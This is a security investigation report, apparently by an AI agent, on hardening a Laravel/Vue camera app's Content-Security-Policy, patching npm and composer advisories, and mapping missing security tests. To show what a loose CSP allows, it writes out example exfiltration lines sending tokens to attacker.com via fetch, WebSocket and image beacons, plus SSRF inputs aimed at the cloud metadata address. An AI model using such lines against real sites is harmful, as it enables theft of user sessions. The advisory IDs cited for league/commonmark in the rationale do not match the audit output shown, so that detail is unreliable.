# Security Investigation Report: Environment, CSP, Dependencies & Test Suites (SEC-17, SEC-18, Test Mapping)

**Author:** Explorer Survey 3  
**Working Directory:** `/home/wsk-devops2/AI-Camera-Integration/.agents/teamwork/teamwork_preview_explorer_survey_3`  
**Date:** 2026-10-07  
**Scope:** SEC-17 (Content-Security-Policy), SEC-18 (NPM & Composer Dependencies), Security Test Suite Mapping (SEC-11 through SEC-19)

---

## 1. Observation

### 1.1 SEC-17: Content-Security-Policy Directives (`SecurityHeaders.php`)

In `app/Http/Middleware/SecurityHeaders.php` (lines 29–37):
```php
$csp = "default-src 'self'; "
    . "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://static.cloudflareinsights.com; "
    . "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
    . "img-src 'self' data: blob: https:; "
    . "font-src 'self' data: https://fonts.gstatic.com; "
    . "connect-src 'self' ws: wss: https: https://cloudflareinsights.com; "
    . "frame-ancestors 'none';";

$response->headers->set('Content-Security-Policy', $csp);
```

#### Deficiencies Observed:
1. **Permissive Network Connections (`connect-src`)**:
   - Contains `ws:`, `wss:`, and `https:` wildcards.
   - Any script execution can exfiltrate tokens, cookies, or user telemetry to arbitrary external WebSocket or HTTPS endpoints worldwide (`fetch('https://attacker.com/steal?data=' + token)` or `new WebSocket('wss://attacker.com')`).
2. **Wildcard Image Loading (`img-src`)**:
   - Contains `https:`.
   - Allows loading tracking pixels, phishing elements, or exfiltrating data via `<img src="https://attacker.com/log?t=...">`.
3. **Unsafe Script Evaluation (`script-src`)**:
   - Contains `'unsafe-eval'` unconditionally.
   - Enables JavaScript `eval()`, `new Function()`, and string-based `setTimeout/setInterval`.
4. **WebAssembly and Worker Architecture**:
   - `resources/js/utils/cameraHqPlayer.js` (lines 259, 419) launches a Web Worker: `new Worker('/player/decoder_worker.js')`.
   - `public/player/decoder_worker.js` (line 13) executes `self.importScripts("./decoder.js")`, which compiles `public/player/decoder.wasm` (`WebAssembly.instantiate`).
   - W3C CSP Level 3 specifies `'wasm-unsafe-eval'` to allow WebAssembly execution without granting JavaScript `eval()` access.
5. **Reverb WebSocket & Vite HMR Connectivity**:
   - Reverb configuration (`config/broadcasting.php:33-43`, `config/reverb.php:76-83`, `.env.example:58-67`):
     - `REVERB_HOST` (e.g. `reverb`, `localhost`, or domain)
     - `REVERB_PORT` (default `8080` or `443`)
     - `REVERB_SCHEME` (`http` -> `ws://`, `https` -> `wss://`)
   - Vite dev configuration (`vite.config.js:35-49`):
     - HMR over `wss://camera-dev.8gategames.com` (clientPort 443) or `ws://localhost:5173`.
   - Cloudflare Insights:
     - Script: `https://static.cloudflareinsights.com`
     - Telemetry: `https://cloudflareinsights.com`

---

### 1.2 SEC-18: Upstream Dependency Vulnerability Audit

#### 1.2.1 NPM Audit (`npm audit --json`)
Execution of `npm audit --json` yielded **5 vulnerabilities** (2 critical, 3 high):
```json
{
  "@vue/server-renderer": {
    "severity": "high",
    "range": "<3.5.42",
    "via": [
      {
        "title": "@vue/server-renderer: XSS via missing CR in attribute-name blacklist",
        "url": "https://github.com/advisories/GHSA-g2v6-rqmx-r4w6",
        "severity": "high"
      }
    ]
  },
  "source-map-js": {
    "severity": "high",
    "range": ">=1.0.0 <1.2.2",
    "via": [
      {
        "title": "source-map-js allows event-loop denial of service through indexed source-map section offsets",
        "url": "https://github.com/advisories/GHSA-68fv-2mgg-jv7q",
        "severity": "high"
      }
    ]
  },
  "shell-quote": {
    "severity": "critical",
    "range": ">=1.8.4 <1.11.0",
    "via": [
      {
        "title": "shell-quote: `quote()` command injection via a line terminator in a token after a `{ comment }` token",
        "url": "https://github.com/advisories/GHSA-pqg4-j6r4-53mv",
        "severity": "critical"
      }
    ]
  },
  "concurrently": {
    "severity": "critical",
    "via": ["shell-quote"]
  },
  "vue": {
    "severity": "high",
    "via": ["@vue/server-renderer"]
  }
}
```

- Dependency Tree Inspection (`npm ls`):
  - `vue@3.5.41` -> `@vue/server-renderer@3.5.41` (vulnerable to GHSA-g2v6-rqmx-r4w6; available latest is `3.5.43`)
  - `concurrently@10.0.5` -> `shell-quote@1.9.0` (vulnerable to GHSA-pqg4-j6r4-53mv; available latest is `1.12.0`)
  - `@tailwindcss/node@4.3.3`, `postcss@8.5.26`, `@vue/compiler-core@3.5.41` -> `source-map-js@1.2.1` (vulnerable to GHSA-68fv-2mgg-jv7q; available latest is `1.2.2`)

#### 1.2.2 Composer Audit (`composer audit --format=json`)
Execution of `composer audit --format=json` yielded **4 advisories** across 3 packages:
```json
{
  "laravel/framework": [
    {
      "advisoryId": "PKSA-d5tc-s1qs-h781",
      "affectedVersions": ">=13.0.0,<13.30.0|<12.69.0",
      "title": "Laravel: XSS in Debug Page Information",
      "cve": "CVE-2026-102279",
      "severity": "low"
    }
  ],
  "league/commonmark": [
    {
      "advisoryId": "PKSA-m2dq-1fhr-29b1",
      "affectedVersions": ">=1.3.0,<=2.10.1",
      "title": "DisallowedRawHtml bypassed when a disallowed tag name ends the raw-HTML literal",
      "severity": "medium"
    },
    {
      "advisoryId": "PKSA-m4t9-vsgq-8khn",
      "affectedVersions": ">=2.0.0,<=2.10.1",
      "title": "Quadratic-time denial of service in the GitHub Flavored Markdown Table extension block-start scan",
      "cve": null,
      "severity": "high"
    }
  ],
  "league/flysystem": [
    {
      "advisoryId": "PKSA-w9tt-7782-78jx",
      "affectedVersions": "<=3.35.2",
      "title": "WhitespacePathNormalizer control-character check is bypassed by malformed UTF-8 in the path",
      "cve": "CVE-2026-102601",
      "severity": "low"
    }
  ]
}
```

- Current Installed vs Patch Target:
  - `laravel/framework`: Installed `v13.26.1`. Target: `>=v13.30.0` (latest `v13.35.0`).
  - `league/commonmark`: Installed `2.10.0`. Target: `>=2.10.2` (latest `2.10.3`).
  - `league/flysystem`: Installed `3.35.2`. Target: `>3.35.2` (latest `3.36.0`).
- Dry-run verification (`composer update --dry-run laravel/framework league/commonmark league/flysystem`) succeeded with zero conflicts:
  - Upgrading `league/flysystem (3.35.2 => 3.36.0)`
  - Upgrading `league/commonmark (2.10.0 => 2.10.3)`
  - Upgrading `laravel/framework (v13.26.1 => v13.35.0)`

---

### 1.3 Security Test Suites & Coverage Baseline

1. **Current Test Suite Run (`php artisan test`)**:
   - Total tests: 360
   - Passed: 358
   - Skipped: 2
   - Failures / Errors: 0
2. **Existing Security Test Files**:
   - `tests/Feature/SecurityRemediationTest.php` (586 lines, 20 test methods): Contains regression tests for historical audit findings (SEC-01 through SEC-15).
   - `tests/Feature/SecurityAdversarialGateTest.php` (712 lines, 16 test methods): Contains adversarial verification for SSRF address ranges, webhook replay/serials/size, password masking, channel auth (`private-devices`, `private-vision-telemetry`, `private-attendance-events`), leave/regularization IDOR and self-approval, CSV sanitization.
   - `tests/Feature/MediaAccessAndUnauthenticatedRouteTest.php` (74 lines, 4 test methods): Tests unauthenticated route returns, media access with query string token (`test_authenticated_user_can_access_stranger_snap_media_with_token_in_query`), and stranger snap subfolders.
3. **Absence of Coverage for SEC-11 through SEC-19**:
   - Neither test suite currently asserts:
     - BOLA check on `EmployeeController::attendanceSummary` (SEC-11)
     - User scoping on `NotificationCreated` broadcast event & channel authorization (SEC-12)
     - Denial of rogue active device creation in `MqttListenCommand` (SEC-13)
     - Signed media route enforcement & deprecation of query tokens (SEC-14)
     - SVG upload rejection & media sandboxing (SEC-15)
     - SSRF validation on `photo_path` in `PersonnelController` (SEC-16)
     - CSP directive restrictions (no wildcards, `'wasm-unsafe-eval'`) (SEC-17)
     - Automated `composer audit` & `npm audit` zero-vulnerability checks (SEC-18)
     - Webhook reverse-proxy loopback bypass restriction in production (SEC-19)

---

## 2. Logic Chain

### 2.1 SEC-17 Content-Security-Policy Hardening Rationale

1. **Restricting `connect-src`**:
   - Removing `https:`, `ws:`, and `wss:` prevents XSS payloads from sending captured session data to arbitrary attacker-controlled infrastructure.
   - The application only communicates via HTTP/XHR with `'self'` and Cloudflare insights (`https://cloudflareinsights.com`), and via WebSockets with Laravel Reverb.
   - Reverb WebSocket endpoints are dynamically constructed from `config('broadcasting.connections.reverb.options')` (host, port, scheme) with fallback to `env('VITE_REVERB_HOST')`.
   - In production, behind SSL reverse proxies, `wss://{$host}` and `ws(s)://{$reverbHost}:{$reverbPort}` are explicitly allowed.
   - In non-production environments (`!app()->environment('production')`), Vite HMR endpoints (`ws://localhost:*`, `wss://localhost:*`, `ws://127.0.0.1:*`, `wss://camera-dev.8gategames.com`) are permitted.

2. **Restricting `img-src`**:
   - Removing wildcard `https:` prevents arbitrary hotlinking, tracking, and image-based data exfiltration.
   - Legitimate image sources in the application are:
     - Local storage / media endpoints (`'self'`)
     - Data URIs for base64 thumbnails and cropped faces (`data:`)
     - Blob URLs for client-side image cropping and canvas previews (`blob:`)
     - Configured cloud storage endpoints (`config('filesystems.disks.s3.url')` and `config('filesystems.disks.s3.endpoint')`)
   - No external arbitrary HTTPS domains are required.

3. **Replacing `'unsafe-eval'` with `'wasm-unsafe-eval'` in `script-src`**:
   - Modern Vue 3 SFCs compiled via `@vitejs/plugin-vue` do not require runtime template compilation (`eval()`).
   - However, `public/player/decoder_worker.js` loads `decoder.wasm` using `WebAssembly.instantiate` for camera H.264/H.265 software decoding.
   - Under CSP Level 3, WebAssembly compilation is governed by `'wasm-unsafe-eval'`.
   - Specifying `'wasm-unsafe-eval'` enables WebAssembly execution while completely disabling JavaScript `eval()` and `new Function()`.
   - In production, `'unsafe-eval'` is eliminated. In development (`!app()->environment('production')`), `'unsafe-eval'` can be conditionally retained if Vite dev server features require it.

4. **Explicit `worker-src`**:
   - Explicitly defining `worker-src 'self' blob:;` ensures `/player/decoder_worker.js` executes reliably across browsers without relying on fallback inheritance.

---

### 2.2 SEC-18 Dependency Patching Rationale

1. **NPM Resolution Strategy**:
   - Direct update in `package.json`:
     - `"vue": "^3.5.43"` (remediates `@vue/server-renderer` GHSA-g2v6-rqmx-r4w6)
   - Transitive pinning via `package.json` `"overrides"`:
     ```json
     "overrides": {
         "shell-quote": "^1.11.0",
         "source-map-js": "^1.2.2"
     }
     ```
     - Remediates `shell-quote` command injection (GHSA-pqg4-j6r4-53mv) pulled by `concurrently`.
     - Remediates `source-map-js` ReDoS (GHSA-68fv-2mgg-jv7q) pulled by `@tailwindcss/node` and `postcss`.

2. **Composer Resolution Strategy**:
   - `laravel/framework`: Bump minimum constraint in `composer.json` from `"^13.17"` to `"^13.30"` (or `"^13.35"`). This patches CVE-2026-102279 (XSS in debug page info).
   - `league/commonmark`: Add `"league/commonmark": "^2.10.3"` to `composer.json` (or update via composer update). This patches GHSA-97jj-33gv-5xf9 and GHSA-3q6v-r5mr-hxv8.
   - `league/flysystem`: Add `"league/flysystem": "^3.36.0"` to `composer.json`. This patches CVE-2026-102601.
   - All three updates have been verified via `composer update --dry-run` to install with zero dependency collisions or breaking API changes.

---

### 2.3 Security Test Suite Architecture & Mapping Rationale

To prevent regression and guarantee full audit validation, test coverage must be established for each finding:

| Finding | Severity | Target File(s) | Existing Test State | Proposed Test Method | Key Assertions |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **SEC-11** | Critical | `EmployeeController.php`, `routes/api.php` | Missing BOLA test on summary | `test_sec11_attendance_summary_prohibits_cross_employee_access` | Employee A requesting Employee B's summary -> 403 Forbidden. Employee A requesting own summary -> 200 OK. Manager requesting Employee B -> 200 OK. |
| **SEC-12** | Critical | `NotificationCreated.php`, `routes/channels.php`, `App.vue` | Channel auth test currently permits any user to global channel | `test_sec12_notifications_broadcast_on_user_scoped_private_channel` | `NotificationCreated` broadcasts to `notifications.{user_id}`. Channel auth on `notifications.{user_id}` accepts target user (200), rejects other users (403). Global `notifications` channel removed or restricted. |
| **SEC-13** | High | `MqttListenCommand.php`, `start-dev.sh` | Missing MQTT un-enrolled device check | `test_sec13_unregistered_mqtt_telemetry_does_not_create_active_device` | Receiving MQTT message with un-enrolled `facesluiceId` does not create active `Device` in DB (dropped or staged `is_active = false`). Verify `ENABLE_INSECURE_MQTT_TUNNEL=false` in dev scripts. |
| **SEC-14** | High | `AuthenticateQueryToken.php`, `bootstrap/app.php`, `media.js` | `MediaAccessAndUnauthenticatedRouteTest` currently validates query tokens | `test_sec14_media_routes_require_valid_signed_url_or_bearer_auth` | Requesting `/api/media/{path}` with query `?token=` without valid signature -> 401/403. Requesting with `URL::temporarySignedRoute` -> 200 OK. Expired signature -> 403. Header `Authorization: Bearer` -> 200 OK. |
| **SEC-15** | Medium | `PersonnelController.php`, `ImageStorageService.php` | Upload tests only test JPEG | `test_sec15_biometric_photo_upload_rejects_svg_files` | Uploading SVG (`image/svg+xml`) to `/api/personnel` -> 422 Unprocessable Entity. Uploading JPEG/PNG/WebP -> 201 Created. Serving SVG via `/api/media` returns attachment or 403. |
| **SEC-16** | Medium | `PersonnelController.php` | `test_sec05` only tests `photo_url` | `test_sec16_photo_path_rejects_private_ips_and_cloud_metadata` | Supplying `photo_path` containing `http://169.254.169.254/latest/meta-data` or `http://127.0.0.1:8000` -> 422 ValidationException. |
| **SEC-17** | Medium | `SecurityHeaders.php` | `test_sec13` only tests presence of CSP header | `test_sec17_content_security_policy_directives_are_hardened` | CSP header lacks `https:`, `ws:`, `wss:` in `connect-src`; lacks `https:` in `img-src`. In production, lacks `'unsafe-eval'`, contains `'wasm-unsafe-eval'`. Contains Reverb and Cloudflare insights origins. |
| **SEC-18** | Medium | `composer.json`, `package.json` | None | `test_sec18_dependency_audit_clean` | Assert `composer audit` and `npm audit` exit code 0 or verify version constraints in lock files. |
| **SEC-19** | Low | `HttpWebhookController.php`, `bootstrap/app.php` | Tests currently run in `testing` env where bypass works | `test_sec19_webhook_loopback_bypass_is_disabled_in_production` | When `app()->environment()` is `'production'`, webhook request from IP `127.0.0.1` without token -> 401 Unauthorized. When in `'local'`/`'testing'`, loopback succeeds. |

---

## 3. Caveats

1. **Vite Development HMR vs Production CSP**:
   - In local development mode (`npm run dev`), Vite injects an inline client script and connects via WebSocket to the Vite dev server (`ws://localhost:5173` or `wss://camera-dev.8gategames.com`).
   - If CSP is overly strict in local dev without environment gating, frontend hot module reloading will fail. `SecurityHeaders` must conditionally append dev origins only when `!app()->environment('production')`.
2. **WebAssembly Decoder Dependency on `'wasm-unsafe-eval'`**:
   - The live camera HQ player (`decoder.wasm`) requires `'wasm-unsafe-eval'`. Completely stripping all `eval`-related keywords without adding `'wasm-unsafe-eval'` will crash the WebAssembly H.264/H.265 video decoder.
3. **Existing Query-Token Test Invalidation**:
   - In `tests/Feature/MediaAccessAndUnauthenticatedRouteTest.php:36`, `test_authenticated_user_can_access_stranger_snap_media_with_token_in_query()` specifically asserts that `?token=` grants access. Implementing SEC-14 requires updating or replacing this test to reflect signed URL enforcement and bearer token headers.
4. **Transitive NPM Overrides**:
   - Running `npm update` alone does not always update deep transitive dependencies of `concurrently` (`shell-quote`) or `@tailwindcss/node` (`source-map-js`). Explicit `"overrides"` in `package.json` are necessary to enforce minimum safe versions.

---

## 4. Conclusion

1. **SEC-17 Remediation Plan (`SecurityHeaders.php`)**:
   - Refactor `SecurityHeaders.php` to construct CSP dynamically:
     - Remove `https:`, `ws:`, `wss:` wildcards from `connect-src`.
     - Remove `https:` wildcard from `img-src`.
     - In `script-src`, replace `'unsafe-eval'` with `'wasm-unsafe-eval'` in production.
     - Add `worker-src 'self' blob:;`.
     - Scope `connect-src` strictly to `'self'`, `https://cloudflareinsights.com`, and configured Reverb WebSocket origins (`ws://{$reverbHost}:{$reverbPort}`, `wss://{$reverbHost}:{$reverbPort}`, `wss://{$reverbHost}`). In development, add `ws://localhost:*`, `wss://localhost:*`, `ws://127.0.0.1:*`, `wss://127.0.0.1:*`, `wss://camera-dev.8gategames.com`.
     - Scope `img-src` strictly to `'self'`, `data:`, `blob:`, and configured S3/R2 endpoints.

2. **SEC-18 Remediation Plan (`package.json`, `composer.json`)**:
   - In `package.json`:
     - Update `"vue": "^3.5.43"`.
     - Add `"overrides": { "shell-quote": "^1.11.0", "source-map-js": "^1.2.2" }`.
     - Run `npm update`.
   - In `composer.json`:
     - Update `"laravel/framework": "^13.30"`.
     - Add `"league/commonmark": "^2.10.3"`.
     - Add `"league/flysystem": "^3.36.0"`.
     - Run `composer update laravel/framework league/commonmark league/flysystem`.

3. **Security Test Suite Mapping**:
   - Add dedicated test methods in `tests/Feature/SecurityRemediationTest.php` and `tests/Feature/SecurityAdversarialGateTest.php` covering all 9 findings (SEC-11 through SEC-19).
   - Update `tests/Feature/MediaAccessAndUnauthenticatedRouteTest.php` to align with SEC-14 signed media routes.

---

## 5. Verification Method

To independently verify all findings and validate subsequent implementations, execute the following commands:

1. **Verify Baseline Test Suite Execution**:
   ```bash
   php artisan test
   ```
   *Expected:* All 358 existing tests pass with 0 errors and 0 failures.

2. **Verify Dependency Vulnerabilities Before & After Patch**:
   ```bash
   composer audit
   npm audit
   ```
   *Baseline:*
   - `composer audit` reports 4 advisories across `laravel/framework`, `league/commonmark`, and `league/flysystem`.
   - `npm audit` reports 5 vulnerabilities (2 critical, 3 high) across `@vue/server-renderer`, `shell-quote`, `source-map-js`, `concurrently`, and `vue`.
   *After Patch:*
   - Both commands must exit code 0 with 0 vulnerabilities detected.

3. **Verify Composer Update Compatibility**:
   ```bash
   composer update --dry-run laravel/framework league/commonmark league/flysystem
   ```
   *Expected:* Successfully resolves `laravel/framework` >= 13.30, `league/commonmark` >= 2.10.3, and `league/flysystem` >= 3.36.0 without dependency conflicts.

4. **Verify Frontend Build Cleanliness**:
   ```bash
   npm run build
   ```
   *Expected:* Vite compiles all chunks (`vendor-vue`, `vendor-realtime`, `vendor-charts-player`) without error.

5. **Verify CSP Header Directives via HTTP**:
   ```bash
   curl -s -I http://127.0.0.1:8000/ | grep -i content-security-policy
   ```
   *Expected:*
   - `connect-src` contains `'self'`, Reverb WebSocket host/port, and `https://cloudflareinsights.com`, and does NOT contain raw `https:`, `ws:`, or `wss:`.
   - `img-src` contains `'self' data: blob:` and does NOT contain raw `https:`.
   - In production, `script-src` contains `'wasm-unsafe-eval'` and does NOT contain `'unsafe-eval'`.

6. **Verify Security Remediation Test Suite Filter**:
   ```bash
   php artisan test --filter=SecurityRemediationTest
   php artisan test --filter=SecurityAdversarialGateTest
   php artisan test --filter=MediaAccessAndUnauthenticatedRouteTest
   ```
   *Expected:* 100% pass across all security suites.
